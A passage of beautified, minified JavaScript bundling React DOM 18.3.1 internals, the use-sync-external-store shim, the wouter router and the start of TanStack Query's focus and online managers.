                        t = Pa(null, t, r, qe(r.type, e), n);
                        break e
                }
                throw Error(T(306, r, ""))
            }
            return t;
        case 0:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : qe(r, o), il(e, t, r, o, n);
        case 1:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : qe(r, o), Na(e, t, r, o, n);
        case 3:
            e: {
                if (uf(t), e === null) throw Error(T(387));r = t.pendingProps,
                i = t.memoizedState,
                o = i.element,
                Id(e, t),
                li(t, r, null, n);
                var s = t.memoizedState;
                if (r = s.element, i.isDehydrated)
                    if (i = {
                            element: r,
                            isDehydrated: !1,
                            cache: s.cache,
                            pendingSuspenseBoundaries: s.pendingSuspenseBoundaries,
                            transitions: s.transitions
                        }, t.updateQueue.baseState = i, t.memoizedState = i, t.flags & 256) {
                        o = or(Error(T(423)), t), t = Ta(e, t, r, n, o);
                        break e
                    } else if (r !== o) {
                    o = or(Error(T(424)), t), t = Ta(e, t, r, n, o);
                    break e
                } else
                    for (De = Kt(t.stateNode.containerInfo.firstChild), Fe = t, G = !0, Je = null, n = Ld(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
                else {
                    if (tr(), r === o) {
                        t = Ct(e, t, n);
                        break e
                    }
                    xe(e, t, r, n)
                }
                t = t.child
            }
            return t;
        case 5:
            return Dd(t), e === null && el(t), r = t.type, o = t.pendingProps, i = e !== null ? e.memoizedProps : null, s = o.children, qs(r, o) ? s = null : i !== null && qs(r, i) && (t.flags |= 32), lf(e, t), xe(e, t, s, n), t.child;
        case 6:
            return e === null && el(t), null;
        case 13:
            return af(e, t, n);
        case 4:
            return Jl(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = nr(t, null, r, n) : xe(e, t, r, n), t.child;
        case 11:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : qe(r, o), Ca(e, t, r, o, n);
        case 7:
            return xe(e, t, t.pendingProps, n), t.child;
        case 8:
            return xe(e, t, t.pendingProps.children, n), t.child;
        case 12:
            return xe(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (r = t.type._context, o = t.pendingProps, i = t.memoizedProps, s = o.value, B(ii, r._currentValue), r._currentValue = s, i !== null)
                    if (nt(i.value, s)) {
                        if (i.children === o.children && !_e.current) {
                            t = Ct(e, t, n);
                            break e
                        }
                    } else
                        for (i = t.child, i !== null && (i.return = t); i !== null;) {
                            var l = i.dependencies;
                            if (l !== null) {
                                s = i.child;
                                for (var u = l.firstContext; u !== null;) {
                                    if (u.context === r) {
                                        if (i.tag === 1) {
                                            u = xt(-1, n & -n), u.tag = 2;
                                            var a = i.updateQueue;
                                            if (a !== null) {
                                                a = a.shared;
                                                var p = a.pending;
                                                p === null ? u.next = u : (u.next = p.next, p.next = u), a.pending = u
                                            }
                                        }
                                        i.lanes |= n, u = i.alternate, u !== null && (u.lanes |= n), tl(i.return, n, t), l.lanes |= n;
                                        break
                                    }
                                    u = u.next
                                }
                            } else if (i.tag === 10) s = i.type === t.type ? null : i.child;
                            else if (i.tag === 18) {
                                if (s = i.return, s === null) throw Error(T(341));
                                s.lanes |= n, l = s.alternate, l !== null && (l.lanes |= n), tl(s, n, t), s = i.sibling
                            } else s = i.child;
                            if (s !== null) s.return = i;
                            else
                                for (s = i; s !== null;) {
                                    if (s === t) {
                                        s = null;
                                        break
                                    }
                                    if (i = s.sibling, i !== null) {
                                        i.return = s.return, s = i;
                                        break
                                    }
                                    s = s.return
                                }
                            i = s
                        }
                xe(e, t, o.children, n),
                t = t.child
            }
            return t;
        case 9:
            return o = t.type, r = t.pendingProps.children, $n(t, n), o = He(o), r = r(o), t.flags |= 1, xe(e, t, r, n), t.child;
        case 14:
            return r = t.type, o = qe(r, t.pendingProps), o = qe(r.type, o), Pa(e, t, r, o, n);
        case 15:
            return of(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : qe(r, o), Uo(e, t), t.tag = 1, Re(r) ? (e = !0, ni(t)) : e = !1, $n(t, n), tf(t, r, o), rl(t, r, o, n), sl(null, t, r, !0, e, n);
        case 19:
            return cf(e, t, n);
        case 22:
            return sf(e, t, n)
    }
    throw Error(T(156, t.tag))
};

function Nf(e, t) {
    return Zc(e, t)
}

function py(e, t, n, r) {
    this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function Be(e, t, n, r) {
    return new py(e, t, n, r)
}

function hu(e) {
    return e = e.prototype, !(!e || !e.isReactComponent)
}

function hy(e) {
    if (typeof e == "function") return hu(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof, e === Ml) return 11;
        if (e === Il) return 14
    }
    return 2
}

function Xt(e, t) {
    var n = e.alternate;
    return n === null ? (n = Be(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function Wo(e, t, n, r, o, i) {
    var s = 2;
    if (r = e, typeof e == "function") hu(e) && (s = 1);
    else if (typeof e == "string") s = 5;
    else e: switch (e) {
        case Nn:
            return mn(n.children, o, i, t);
        case Ll:
            s = 8, o |= 8;
            break;
        case Ts:
            return e = Be(12, n, t, o | 2), e.elementType = Ts, e.lanes = i, e;
        case _s:
            return e = Be(13, n, t, o), e.elementType = _s, e.lanes = i, e;
        case Rs:
            return e = Be(19, n, t, o), e.elementType = Rs, e.lanes = i, e;
        case Dc:
            return Li(n, o, i, t);
        default:
            if (typeof e == "object" && e !== null) switch (e.$$typeof) {
                case Mc:
                    s = 10;
                    break e;
                case Ic:
                    s = 9;
                    break e;
                case Ml:
                    s = 11;
                    break e;
                case Il:
                    s = 14;
                    break e;
                case Mt:
                    s = 16, r = null;
                    break e
            }
            throw Error(T(130, e == null ? e : typeof e, ""))
    }
    return t = Be(s, n, t, o), t.elementType = e, t.type = r, t.lanes = i, t
}

function mn(e, t, n, r) {
    return e = Be(7, e, r, t), e.lanes = n, e
}

function Li(e, t, n, r) {
    return e = Be(22, e, r, t), e.elementType = Dc, e.lanes = n, e.stateNode = {
        isHidden: !1
    }, e
}

function vs(e, t, n) {
    return e = Be(6, e, null, t), e.lanes = n, e
}

function gs(e, t, n) {
    return t = Be(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    }, t
}

function my(e, t, n, r, o) {
    this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = Zi(0), this.expirationTimes = Zi(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = Zi(0), this.identifierPrefix = r, this.onRecoverableError = o, this.mutableSourceEagerHydrationData = null
}

function mu(e, t, n, r, o, i, s, l, u) {
    return e = new my(e, t, n, l, u), t === 1 ? (t = 1, i === !0 && (t |= 8)) : t = 0, i = Be(3, null, null, t), e.current = i, i.stateNode = e, i.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    }, Zl(i), e
}

function yy(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: Pn,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}

function Tf(e) {
    if (!e) return Jt;
    e = e._reactInternals;
    e: {
        if (En(e) !== e || e.tag !== 1) throw Error(T(170));
        var t = e;do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (Re(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e
                    }
            }
            t = t.return
        } while (t !== null);
        throw Error(T(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (Re(n)) return Nd(e, n, t)
    }
    return t
}

function _f(e, t, n, r, o, i, s, l, u) {
    return e = mu(n, r, !0, e, o, i, s, l, u), e.context = Tf(null), n = e.current, r = ke(), o = Yt(n), i = xt(r, o), i.callback = t ? ? null, Gt(n, i, o), e.current.lanes = o, oo(e, o, r), je(e, r), e
}

function Mi(e, t, n, r) {
    var o = t.current,
        i = ke(),
        s = Yt(o);
    return n = Tf(n), t.context === null ? t.context = n : t.pendingContext = n, t = xt(i, s), t.payload = {
        element: e
    }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = Gt(o, t, s), e !== null && (tt(e, o, s, i), Ao(e, o, s)), s
}

function mi(e) {
    if (e = e.current, !e.child) return null;
    switch (e.child.tag) {
        case 5:
            return e.child.stateNode;
        default:
            return e.child.stateNode
    }
}

function Aa(e, t) {
    if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}

function yu(e, t) {
    Aa(e, t), (e = e.alternate) && Aa(e, t)
}

function vy() {
    return null
}
var Rf = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
};

function vu(e) {
    this._internalRoot = e
}
Ii.prototype.render = vu.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null) throw Error(T(409));
    Mi(e, t, null, null)
};
Ii.prototype.unmount = vu.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        xn(function() {
            Mi(null, e, null, null)
        }), t[kt] = null
    }
};

function Ii(e) {
    this._internalRoot = e
}
Ii.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = id();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < Dt.length && t !== 0 && t < Dt[n].priority; n++);
        Dt.splice(n, 0, e), n === 0 && ld(e)
    }
};

function gu(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function Di(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function za() {}

function gy(e, t, n, r, o) {
    if (o) {
        if (typeof r == "function") {
            var i = r;
            r = function() {
                var a = mi(s);
                i.call(a)
            }
        }
        var s = _f(t, r, e, 0, null, !1, !1, "", za);
        return e._reactRootContainer = s, e[kt] = s.current, Wr(e.nodeType === 8 ? e.parentNode : e), xn(), s
    }
    for (; o = e.lastChild;) e.removeChild(o);
    if (typeof r == "function") {
        var l = r;
        r = function() {
            var a = mi(u);
            l.call(a)
        }
    }
    var u = mu(e, 0, !1, null, null, !1, !1, "", za);
    return e._reactRootContainer = u, e[kt] = u.current, Wr(e.nodeType === 8 ? e.parentNode : e), xn(function() {
        Mi(t, u, n, r)
    }), u
}

function Fi(e, t, n, r, o) {
    var i = n._reactRootContainer;
    if (i) {
        var s = i;
        if (typeof o == "function") {
            var l = o;
            o = function() {
                var u = mi(s);
                l.call(u)
            }
        }
        Mi(t, s, e, o)
    } else s = gy(n, t, e, o, r);
    return mi(s)
}
rd = function(e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = Er(t.pendingLanes);
                n !== 0 && (Al(t, n | 1), je(t, ne()), !($ & 6) && (ir = ne() + 500, nn()))
            }
            break;
        case 13:
            xn(function() {
                var r = Et(e, 1);
                if (r !== null) {
                    var o = ke();
                    tt(r, e, 1, o)
                }
            }), yu(e, 1)
    }
};
zl = function(e) {
    if (e.tag === 13) {
        var t = Et(e, 134217728);
        if (t !== null) {
            var n = ke();
            tt(t, e, 134217728, n)
        }
        yu(e, 134217728)
    }
};
od = function(e) {
    if (e.tag === 13) {
        var t = Yt(e),
            n = Et(e, t);
        if (n !== null) {
            var r = ke();
            tt(n, e, t, r)
        }
        yu(e, t)
    }
};
id = function() {
    return W
};
sd = function(e, t) {
    var n = W;
    try {
        return W = e, t()
    } finally {
        W = n
    }
};
bs = function(e, t, n) {
    switch (t) {
        case "input":
            if (Ls(e, n), t = n.name, n.type === "radio" && t != null) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var o = Ni(r);
                        if (!o) throw Error(T(90));
                        Ac(r), Ls(r, o)
                    }
                }
            }
            break;
        case "textarea":
            bc(e, n);
            break;
        case "select":
            t = n.value, t != null && An(e, !!n.multiple, t, !1)
    }
};
Hc = du;
Kc = xn;
var wy = {
        usingClientEntryPoint: !1,
        Events: [so, jn, Ni, Bc, Qc, du]
    },
    gr = {
        findFiberByHostInstance: ln,
        bundleType: 0,
        version: "18.3.1",
        rendererPackageName: "react-dom"
    },
    xy = {
        bundleType: gr.bundleType,
        version: gr.version,
        rendererPackageName: gr.rendererPackageName,
        rendererConfig: gr.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: Nt.ReactCurrentDispatcher,
        findHostInstanceByFiber: function(e) {
            return e = Yc(e), e === null ? null : e.stateNode
        },
        findFiberByHostInstance: gr.findFiberByHostInstance || vy,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var To = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!To.isDisabled && To.supportsFiber) try {
        ki = To.inject(xy), dt = To
    } catch {}
}
ze.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = wy;
ze.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!gu(t)) throw Error(T(200));
    return yy(e, t, null, n)
};
ze.createRoot = function(e, t) {
    if (!gu(e)) throw Error(T(299));
    var n = !1,
        r = "",
        o = Rf;
    return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (o = t.onRecoverableError)), t = mu(e, 1, !1, null, null, n, !1, r, o), e[kt] = t.current, Wr(e.nodeType === 8 ? e.parentNode : e), new vu(t)
};
ze.findDOMNode = function(e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0) throw typeof e.render == "function" ? Error(T(188)) : (e = Object.keys(e).join(","), Error(T(268, e)));
    return e = Yc(t), e = e === null ? null : e.stateNode, e
};
ze.flushSync = function(e) {
    return xn(e)
};
ze.hydrate = function(e, t, n) {
    if (!Di(t)) throw Error(T(200));
    return Fi(null, e, t, !0, n)
};
ze.hydrateRoot = function(e, t, n) {
    if (!gu(e)) throw Error(T(405));
    var r = n != null && n.hydratedSources || null,
        o = !1,
        i = "",
        s = Rf;
    if (n != null && (n.unstable_strictMode === !0 && (o = !0), n.identifierPrefix !== void 0 && (i = n.identifierPrefix), n.onRecoverableError !== void 0 && (s = n.onRecoverableError)), t = _f(t, null, e, 1, n ? ? null, o, !1, i, s), e[kt] = t.current, Wr(e), r)
        for (e = 0; e < r.length; e++) n = r[e], o = n._getVersion, o = o(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, o] : t.mutableSourceEagerHydrationData.push(n, o);
    return new Ii(t)
};
ze.render = function(e, t, n) {
    if (!Di(t)) throw Error(T(200));
    return Fi(null, e, t, !1, n)
};
ze.unmountComponentAtNode = function(e) {
    if (!Di(e)) throw Error(T(40));
    return e._reactRootContainer ? (xn(function() {
        Fi(null, null, e, !1, function() {
            e._reactRootContainer = null, e[kt] = null
        })
    }), !0) : !1
};
ze.unstable_batchedUpdates = du;
ze.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!Di(n)) throw Error(T(200));
    if (e == null || e._reactInternals === void 0) throw Error(T(38));
    return Fi(e, t, n, !1, r)
};
ze.version = "18.3.1-next-f1338f8080-20240426";

function jf() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(jf)
    } catch (e) {
        console.error(e)
    }
}
jf(), Rc.exports = ze;
var Ai = Rc.exports;
const Sy = vc(Ai);
var Of, ba = Ai;
Of = ba.createRoot, ba.hydrateRoot;

function ky(e, t) {
    if (e instanceof RegExp) return {
        keys: !1,
        pattern: e
    };
    var n, r, o, i, s = [],
        l = "",
        u = e.split("/");
    for (u[0] || u.shift(); o = u.shift();) n = o[0], n === "*" ? (s.push(n), l += o[1] === "?" ? "(?:/(.*))?" : "/(.*)") : n === ":" ? (r = o.indexOf("?", 1), i = o.indexOf(".", 1), s.push(o.substring(1, ~r ? r : ~i ? i : o.length)), l += ~r && !~i ? "(?:/([^/]+?))?" : "/([^/]+?)", ~i && (l += (~r ? "?" : "") + "\\" + o.substring(i))) : l += "/" + o;
    return {
        keys: s,
        pattern: new RegExp("^" + l + (t ? "(?=$|/)" : "/?$"), "i")
    }
}
var Lf = {
        exports: {}
    },
    Mf = {};
/**
 * @license React
 * use-sync-external-store-shim.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var sr = g;

function Ey(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var Cy = typeof Object.is == "function" ? Object.is : Ey,
    Py = sr.useState,
    Ny = sr.useEffect,
    Ty = sr.useLayoutEffect,
    _y = sr.useDebugValue;

function Ry(e, t) {
    var n = t(),
        r = Py({
            inst: {
                value: n,
                getSnapshot: t
            }
        }),
        o = r[0].inst,
        i = r[1];
    return Ty(function() {
        o.value = n, o.getSnapshot = t, ws(o) && i({
            inst: o
        })
    }, [e, n, t]), Ny(function() {
        return ws(o) && i({
            inst: o
        }), e(function() {
            ws(o) && i({
                inst: o
            })
        })
    }, [e]), _y(n), n
}

function ws(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !Cy(e, n)
    } catch {
        return !0
    }
}

function jy(e, t) {
    return t()
}
var Oy = typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u" ? jy : Ry;
Mf.useSyncExternalStore = sr.useSyncExternalStore !== void 0 ? sr.useSyncExternalStore : Oy;
Lf.exports = Mf;
var Ly = Lf.exports;
const My = ch.useInsertionEffect,
    Iy = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u",
    Dy = Iy ? g.useLayoutEffect : g.useEffect,
    Fy = My || Dy,
    If = e => {
        const t = g.useRef([e, (...n) => t[0](...n)]).current;
        return Fy(() => {
            t[0] = e
        }), t[1]
    },
    Ay = "popstate",
    wu = "pushState",
    xu = "replaceState",
    zy = "hashchange",
    Ua = [Ay, wu, xu, zy],
    by = e => {
        for (const t of Ua) addEventListener(t, e);
        return () => {
            for (const t of Ua) removeEventListener(t, e)
        }
    },
    Df = (e, t) => Ly.useSyncExternalStore(by, e, t),
    Uy = () => location.search,
    $y = ({
        ssrSearch: e = ""
    } = {}) => Df(Uy, () => e),
    $a = () => location.pathname,
    Vy = ({
        ssrPath: e
    } = {}) => Df($a, e ? () => e : $a),
    Wy = (e, {
        replace: t = !1,
        state: n = null
    } = {}) => history[t ? xu : wu](n, "", e),
    By = (e = {}) => [Vy(e), Wy],
    Va = Symbol.for("wouter_v3");
if (typeof history < "u" && typeof window[Va] > "u") {
    for (const e of [wu, xu]) {
        const t = history[e];
        history[e] = function() {
            const n = t.apply(this, arguments),
                r = new Event(e);
            return r.arguments = arguments, dispatchEvent(r), n
        }
    }
    Object.defineProperty(window, Va, {
        value: !0
    })
}
const Qy = (e, t) => t.toLowerCase().indexOf(e.toLowerCase()) ? "~" + t : t.slice(e.length) || "/",
    Ff = (e = "") => e === "/" ? "" : e,
    Hy = (e, t) => e[0] === "~" ? e.slice(1) : Ff(t) + e,
    Ky = (e = "", t) => Qy(Wa(Ff(e)), Wa(t)),
    Wa = e => {
        try {
            return decodeURI(e)
        } catch {
            return e
        }
    },
    Af = {
        hook: By,
        searchHook: $y,
        parser: ky,
        base: "",
        ssrPath: void 0,
        ssrSearch: void 0,
        hrefs: e => e
    },
    zf = g.createContext(Af),
    zi = () => g.useContext(zf),
    bf = {},
    Uf = g.createContext(bf),
    $f = () => g.useContext(Uf),
    Su = e => {
        const [t, n] = e.hook(e);
        return [Ky(e.base, t), If((r, o) => n(Hy(r, e.base), o))]
    },
    Vf = (e, t, n, r) => {
        const {
            pattern: o,
            keys: i
        } = t instanceof RegExp ? {
            keys: !1,
            pattern: t
        } : e(t || "*", r), s = o.exec(n) || [], [l, ...u] = s;
        return l !== void 0 ? [!0, (() => {
            const a = i !== !1 ? Object.fromEntries(i.map((m, h) => [m, u[h]])) : s.groups;
            let p = { ...u
            };
            return a && Object.assign(p, a), p
        })(), ...r ? [l] : []] : [!1, null]
    },
    Gy = ({
        children: e,
        ...t
    }) => {
        var p, m;
        const n = zi(),
            r = t.hook ? Af : n;
        let o = r;
        const [i, s] = ((p = t.ssrPath) == null ? void 0 : p.split("?")) ? ? [];
        s && (t.ssrSearch = s, t.ssrPath = i), t.hrefs = t.hrefs ? ? ((m = t.hook) == null ? void 0 : m.hrefs);
        let l = g.useRef({}),
            u = l.current,
            a = u;
        for (let h in r) {
            const w = h === "base" ? r[h] + (t[h] || "") : t[h] || r[h];
            u === a && w !== a[h] && (l.current = a = { ...a
            }), a[h] = w, w !== r[h] && (o = a)
        }
        return g.createElement(zf.Provider, {
            value: o,
            children: e
        })
    },
    Ba = ({
        children: e,
        component: t
    }, n) => t ? g.createElement(t, {
        params: n
    }) : typeof e == "function" ? e(n) : e,
    qy = e => {
        let t = g.useRef(bf),
            n = t.current;
        for (const r in e) e[r] !== n[r] && (n = e);
        return Object.keys(e).length === 0 && (n = e), t.current = n
    },
    _o = ({
        path: e,
        nest: t,
        match: n,
        ...r
    }) => {
        const o = zi(),
            [i] = Su(o),
            [s, l, u] = n ? ? Vf(o.parser, e, i, t),
            a = qy({ ...$f(),
                ...l
            });
        if (!s) return null;
        const p = u ? g.createElement(Gy, {
            base: u
        }, Ba(r, a)) : Ba(r, a);
        return g.createElement(Uf.Provider, {
            value: a,
            children: p
        })
    };
g.forwardRef((e, t) => {
    const n = zi(),
        [r, o] = Su(n),
        {
            to: i = "",
            href: s = i,
            onClick: l,
            asChild: u,
            children: a,
            className: p,
            replace: m,
            state: h,
            ...w
        } = e,
        k = If(S => {
            S.ctrlKey || S.metaKey || S.altKey || S.shiftKey || S.button !== 0 || (l == null || l(S), S.defaultPrevented || (S.preventDefault(), o(s, e)))
        }),
        v = n.hrefs(s[0] === "~" ? s.slice(1) : n.base + s, n);
    return u && g.isValidElement(a) ? g.cloneElement(a, {
        onClick: k,
        href: v
    }) : g.createElement("a", { ...w,
        onClick: k,
        href: v,
        className: p != null && p.call ? p(r === s) : p,
        children: a,
        ref: t
    })
});
const Wf = e => Array.isArray(e) ? e.flatMap(t => Wf(t && t.type === g.Fragment ? t.props.children : t)) : [e],
    Yy = ({
        children: e,
        location: t
    }) => {
        const n = zi(),
            [r] = Su(n);
        for (const o of Wf(e)) {
            let i = 0;
            if (g.isValidElement(o) && (i = Vf(n.parser, o.props.path, t || r, o.props.nest))[0]) return g.cloneElement(o, {
                match: i
            })
        }
        return null
    };
var bi = class {
        constructor() {
            this.listeners = new Set, this.subscribe = this.subscribe.bind(this)
        }
        subscribe(e) {
            return this.listeners.add(e), this.onSubscribe(), () => {
                this.listeners.delete(e), this.onUnsubscribe()
            }
        }
        hasListeners() {
            return this.listeners.size > 0
        }
        onSubscribe() {}
        onUnsubscribe() {}
    },
    Ui = typeof window > "u" || "Deno" in globalThis;

function Ye() {}

function Xy(e, t) {
    return typeof e == "function" ? e(t) : e
}

function Zy(e) {
    return typeof e == "number" && e >= 0 && e !== 1 / 0
}

function Jy(e, t) {
    return Math.max(e + (t || 0) - Date.now(), 0)
}

function Qa(e, t) {
    return typeof e == "function" ? e(t) : e
}

function ev(e, t) {
    return typeof e == "function" ? e(t) : e
}

function Ha(e, t) {
    const {
        type: n = "all",
        exact: r,
        fetchStatus: o,
        predicate: i,
        queryKey: s,
        stale: l
    } = e;
    if (s) {
        if (r) {
            if (t.queryHash !== ku(s, t.options)) return !1
        } else if (!Jr(t.queryKey, s)) return !1
    }
    if (n !== "all") {
        const u = t.isActive();
        if (n === "active" && !u || n === "inactive" && u) return !1
    }
    return !(typeof l == "boolean" && t.isStale() !== l || o && o !== t.state.fetchStatus || i && !i(t))
}

function Ka(e, t) {
    const {
        exact: n,
        status: r,
        predicate: o,
        mutationKey: i
    } = e;
    if (i) {
        if (!t.options.mutationKey) return !1;
        if (n) {
            if (Zr(t.options.mutationKey) !== Zr(i)) return !1
        } else if (!Jr(t.options.mutationKey, i)) return !1
    }
    return !(r && t.state.status !== r || o && !o(t))
}

function ku(e, t) {
    return ((t == null ? void 0 : t.queryKeyHashFn) || Zr)(e)
}

function Zr(e) {
    return JSON.stringify(e, (t, n) => gl(n) ? Object.keys(n).sort().reduce((r, o) => (r[o] = n[o], r), {}) : n)
}

function Jr(e, t) {
    return e === t ? !0 : typeof e != typeof t ? !1 : e && t && typeof e == "object" && typeof t == "object" ? !Object.keys(t).some(n => !Jr(e[n], t[n])) : !1
}

function Bf(e, t) {
    if (e === t) return e;
    const n = Ga(e) && Ga(t);
    if (n || gl(e) && gl(t)) {
        const r = n ? e : Object.keys(e),
            o = r.length,
            i = n ? t : Object.keys(t),
            s = i.length,
            l = n ? [] : {};
        let u = 0;
        for (let a = 0; a < s; a++) {
            const p = n ? a : i[a];
            (!n && r.includes(p) || n) && e[p] === void 0 && t[p] === void 0 ? (l[p] = void 0, u++) : (l[p] = Bf(e[p], t[p]), l[p] === e[p] && e[p] !== void 0 && u++)
        }
        return o === s && u === o ? e : l
    }
    return t
}

function Ga(e) {
    return Array.isArray(e) && e.length === Object.keys(e).length
}

function gl(e) {
    if (!qa(e)) return !1;
    const t = e.constructor;
    if (t === void 0) return !0;
    const n = t.prototype;
    return !(!qa(n) || !n.hasOwnProperty("isPrototypeOf") || Object.getPrototypeOf(e) !== Object.prototype)
}

function qa(e) {
    return Object.prototype.toString.call(e) === "[object Object]"
}

function tv(e) {
    return new Promise(t => {
        setTimeout(t, e)
    })
}

function nv(e, t, n) {
    return typeof n.structuralSharing == "function" ? n.structuralSharing(e, t) : n.structuralSharing !== !1 ? Bf(e, t) : t
}

function rv(e, t, n = 0) {
    const r = [...e, t];
    return n && r.length > n ? r.slice(1) : r
}

function ov(e, t, n = 0) {
    const r = [t, ...e];
    return n && r.length > n ? r.slice(0, -1) : r
}
var Eu = Symbol();

function Qf(e, t) {
    return !e.queryFn && (t != null && t.initialPromise) ? () => t.initialPromise : !e.queryFn || e.queryFn === Eu ? () => Promise.reject(new Error(`Missing queryFn: '${e.queryHash}'`)) : e.queryFn
}
var cn, At, Bn, ac, iv = (ac = class extends bi {
        constructor() {
            super();
            V(this, cn);
            V(this, At);
            V(this, Bn);
            A(this, Bn, t => {
                if (!Ui && window.addEventListener) {
                    const n = () => t();
                    return window.addEventListener("visibilitychange", n, !1), () => {
                        window.removeEventListener("visibilitychange", n)
                    }
                }
            })
        }
        onSubscribe() {
            E(this, At) || this.setEventListener(E(this, Bn))
        }
        onUnsubscribe() {
            var t;
            this.hasListeners() || ((t = E(this, At)) == null || t.call(this), A(this, At, void 0))
        }
        setEventListener(t) {
            var n;
            A(this, Bn, t), (n = E(this, At)) == null || n.call(this), A(this, At, t(r => {
                typeof r == "boolean" ? this.setFocused(r) : this.onFocus()
            }))
        }
        setFocused(t) {
            E(this, cn) !== t && (A(this, cn, t), this.onFocus())
        }
        onFocus() {
            const t = this.isFocused();
            this.listeners.forEach(n => {
                n(t)
            })
        }
        isFocused() {
            var t;
            return typeof E(this, cn) == "boolean" ? E(this, cn) : ((t = globalThis.document) == null ? void 0 : t.visibilityState) !== "hidden"
        }
    }, cn = new WeakMap, At = new WeakMap, Bn = new WeakMap, ac),
    Hf = new iv,
    Qn, zt, Hn, cc, sv = (cc = class extends bi {
        constructor() {
            super();
            V(this, Qn, !0);
            V(this, zt);
            V(this, Hn);
            A(this, Hn, t => {
                if (!Ui && window.addEventListener) {
                    const n = () => t(!0),
                        r = () => t(!1);
                    return window.addEventListener("online", n, !1), window.addEventListener("offline", r, !1), () => {
                        window.removeEventListener("online", n), window.removeEventListener("offline", r)
                    }
                }
            })
        }
        onSubscribe() {
            E(this, zt) || this.setEventListener(E(this, Hn))
